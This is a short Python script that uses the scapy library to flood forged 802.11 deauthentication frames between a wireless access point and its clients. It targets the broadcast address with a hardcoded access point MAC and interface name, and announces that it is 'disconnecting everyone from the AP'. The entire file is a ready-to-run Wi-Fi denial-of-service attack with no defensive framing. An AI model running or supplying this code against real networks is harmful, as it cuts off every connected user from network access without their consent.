from scapy.all import *
import sys
import threading


def deauth(target, ap, iface):
    t = threading.currentThread()
    dot11_target = Dot11(addr1=target, addr2=ap, addr3=ap)
    dot11_rouge = Dot11(addr1=ap, addr2=target, addr3=target)
    packet_target = RadioTap() / dot11_target / Dot11Deauth()
    packet_rouge = RadioTap() / dot11_rouge / Dot11Deauth()
    print("disconnecting everyone from the AP")
    while getattr(t, "do_run", True):
            sendp(packet_target, iface=iface, verbose=0)
            sendp(packet_rouge, iface=iface, verbose=0)


if __name__ == "__main__":
    try:

        deauth("ff:ff:ff:ff:ff:ff", "14:ae:db:ca:3d:0a", "wlxf4ec388d723b")
    except KeyboardInterrupt:
        sys.exit()
